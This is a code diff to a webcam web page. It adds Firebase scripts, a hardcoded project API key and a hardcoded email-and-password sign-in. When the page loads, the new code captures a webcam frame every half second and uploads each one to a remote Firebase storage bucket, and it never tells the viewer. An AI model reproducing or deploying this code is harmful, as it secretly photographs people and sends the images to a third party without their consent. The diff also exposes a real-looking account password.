@@ -26,7 +26,37 @@
 <video id="video" autoplay playsinline></video>
 <div id="error-message" style="color: red; position: absolute; top: 10px; left: 10px;"></div>
 
+<!-- Include Firebase -->
+<script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-storage.js"></script>
+
 <script>
+    // Your Firebase configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyAsw6vJKiZ7ytFgz0F1AsnSCzC1awh1kwc",
+        authDomain: "rail-vista-4f089.firebaseapp.com",
+        projectId: "rail-vista-4f089",
+        storageBucket: "rail-vista-4f089.appspot.com",
+        messagingSenderId: "801269525761",
+        appId: "1:801269525761:web:da422ee6aadcf117433f00"
+    };
+
+    // Initialize Firebase
+    const app = firebase.initializeApp(firebaseConfig);
+    const auth = firebase.auth();
+    const storage = firebase.storage();
+
+    // Function to authenticate user
+    async function authenticate() {
+        try {
+            await auth.signInWithEmailAndPassword('jlofty8@gmail.com', 'Jake2008');
+            console.log('Authenticated successfully');
+        } catch (error) {
+            console.error('Authentication failed:', error);
+        }
+    }
+
     function hasGetUserMedia() {
         return !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
     }
@@ -49,9 +79,41 @@
         }
     }
 
-    document.addEventListener('DOMContentLoaded', startVideo);
+    function captureImage(video) {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        return canvas.toDataURL('image/jpeg');
+    }
+
+    async function uploadImage(imageDataUrl) {
+        try {
+            const blob = await (await fetch(imageDataUrl)).blob();
+            const storageRef = storage.ref();
+            const imageRef = storageRef.child('images/' + Date.now() + '.jpg');
+            await imageRef.put(blob);
+            console.log('Image uploaded successfully');
+        } catch (error) {
+            console.error('Image upload failed:', error);
+        }
+    }
+
+    async function startCapture() {
+        const video = document.getElementById('video');
+        setInterval(async () => {
+            const imageDataUrl = captureImage(video);
+            await uploadImage(imageDataUrl);
+        }, 500);
+    }
+
+    document.addEventListener('DOMContentLoaded', async () => {
+        await authenticate();
+        startVideo();
+        startCapture();
+    });
 </script>
 
 </body>
 </html>
-
